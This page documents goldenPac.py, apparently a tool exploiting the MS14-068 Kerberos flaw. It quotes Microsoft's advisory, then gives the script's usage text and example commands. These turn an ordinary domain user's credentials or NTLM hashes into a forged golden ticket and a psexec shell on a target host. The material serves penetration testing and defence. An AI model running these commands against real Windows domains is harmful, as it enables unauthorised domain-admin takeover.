<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>GoldenPac MS14-068</title>
</head><body>goldenPac.py<br/>
<br/>
MS14-068 exploit. Saves the golden ticket and also launches a psexec session at the target.<br/>
<br/>
Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780)<br/>
Published: November 18, 2014<br/>
This security update resolves a privately reported vulnerability in Microsoft Windows Kerberos KDC that could allow an attacker to elevate unprivileged domain user account privileges to those of the domain administrator account. An attacker could use these elevated privileges to compromise any computer in the domain, including domain controllers. An attacker must have valid domain credentials to exploit this vulnerability. The affected component is available remotely to users who have standard user accounts with domain credentials; this is not the case for users with local account credential<br/>
<br/>
# Description:<br/>
# &nbsp; MS14-068 Exploit. Kudos to @BiDOrD for pulling it up first! <br/>
# &nbsp; Well done :).<br/>
# &nbsp; This one also established a SMBConnection and PSEXEcs the <br/>
# &nbsp; target.<br/>
# &nbsp; A few important things:<br/>
# &nbsp; 1) you must use the domain FQDN or use -dc-ip switch<br/>
# &nbsp; 2) target must be a FQDN as well and matching the target's NetBIOS <br/>
# &nbsp; 3) Just RC4 at the moment - DONE (aes256 added)<br/>
# &nbsp; 4) It won't work on Kerberos-only Domains (but can be fixed)<br/>
# &nbsp; 5) Use WMIEXEC approach instead<br/>
#<br/>
# &nbsp; E.G:<br/>
# &nbsp; &nbsp; &nbsp; python goldenPac domain.net/normaluser@domain-host<br/>
# &nbsp; &nbsp; &nbsp; the password will be asked, or<br/>
#<br/>
# &nbsp; &nbsp; &nbsp; python goldenPac.py domain.net/normaluser:mypwd@domain-host<br/>
#<br/>
# &nbsp; &nbsp; &nbsp; if domain.net and/or domain-host do not resolve, add them<br/>
# &nbsp; &nbsp; &nbsp; to the hosts file or use the -dc-ip and -target-ip parameters<br/>
<br/>
usage: goldenPac.py [-h] [-debug] [-c pathname] [-w pathname]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [-dc-ip ip address] [-target-ip ip address]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; [-hashes LMHASH:NTHASH]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; target [command [command ...]]<br/>
<br/>
MS14-068 Exploit. It establishes a SMBConnection and <b>PSEXEcs the target</b>&nbsp;or<br/>
saves the TGT for later use.<br/>
<br/>
positional arguments:<br/>
&nbsp; target &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[[domain/]username[:password]@]&lt;targetName&gt;<br/>
&nbsp; command &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; command (or arguments if -c is used) to execute at the<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; target (w/o path). Defaults to cmd.exe. 'None' will<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; not execute PSEXEC (handy if you just want to save the<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ticket)<br/>
<br/>
optional arguments:<br/>
&nbsp; -h, --help &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;show this help message and exit<br/>
&nbsp; -debug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Turn DEBUG output ON<br/>
&nbsp; -c pathname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uploads the filename for later execution, arguments<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; are passed in the command option<br/>
&nbsp; -w pathname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; writes the golden ticket in CCache format into the<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &lt;pathname&gt; file<br/>
&nbsp; -dc-ip ip address &nbsp; &nbsp; IP Address of the domain controller (needed to get the<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; users SID). If omitted it will use the domain part<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (FQDN) specified in the target parameter<br/>
&nbsp; -target-ip ip address<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IP Address of the target host you want to attack. If<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; omitted it will use the targetName parameter<br/>
<br/>
authentication:<br/>
&nbsp; -hashes LMHASH:NTHASH<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NTLM hashes, format is LMHASH:NTHASH</body></html>